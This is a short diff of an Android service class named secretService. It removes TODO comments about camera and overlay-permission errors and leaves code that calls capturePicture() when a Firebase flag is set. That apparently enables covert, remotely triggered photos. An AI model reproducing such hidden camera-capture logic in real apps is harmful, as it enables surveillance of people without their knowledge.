@@ -103,13 +103,6 @@ public class secretService extends Service
                 Log.e("Service", "serving");
                 user = snapshot.getValue(Users.class); // DONT EVER DELETE THIS AGAIN
 
-
-                //TODO: An error occurred while connecting to camera 0: Status(-8, EX_SERVICE_SPECIFIC): '6: connectHelper:2498: Camera "0" disabled by policy'
-                //TODO: java.lang.RuntimeException: Fail to connect to camera service\
-                //TODO: Error 2
-                //TODO: android.view.WindowManager$BadTokenException: Unable to add window android.view.ViewRootImpl$W@55bfd19 -- permission denied for window type 2006
-                //TODO: NEED TO MAKE A PERMISSION REQUEST FOR THIS
-                //TODO: IM THE FUCKING GOAT, JUST TAKE THE IMAGE FROM FIREBASE STORAGE AND YOU DONE!!!!!!!
                 assert user != null;
                 if(user.getToCapture() == 1)
                     capturePicture();
